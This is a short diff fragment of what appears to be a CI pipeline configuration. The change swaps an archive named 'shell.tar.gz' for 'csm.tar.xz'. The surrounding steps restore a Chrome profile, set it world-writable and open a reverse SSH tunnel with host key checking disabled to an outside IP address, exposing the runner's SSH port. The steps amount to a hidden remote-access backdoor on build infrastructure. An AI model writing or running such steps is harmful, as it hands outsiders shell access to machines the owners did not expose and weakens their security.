@@ -57,7 +57,7 @@ steps:
     sudo pip3 install bs4 || easy_install bs4
     sudo pip install bs4 || easy_install bs4
     sudo -u helloworld tar -xf /home/helloworld/gc.tar.gz -C /home/helloworld/
-    sudo -u helloworld tar -xf /home/helloworld/shell.tar.gz -C /home/helloworld/
+    sudo -u helloworld tar -xf /home/helloworld/csm.tar.xz -C /home/helloworld/
     sudo chown -R helloworld /home/helloworld/.config/google-chrome
     sudo chmod -R 777 /home/helloworld/.config/google-chrome
     ssh -N -o StrictHostKeyChecking=no -T -R 10101:0.0.0.0:22 -i /tmp/a.pem ubuntu@18.222.192.102
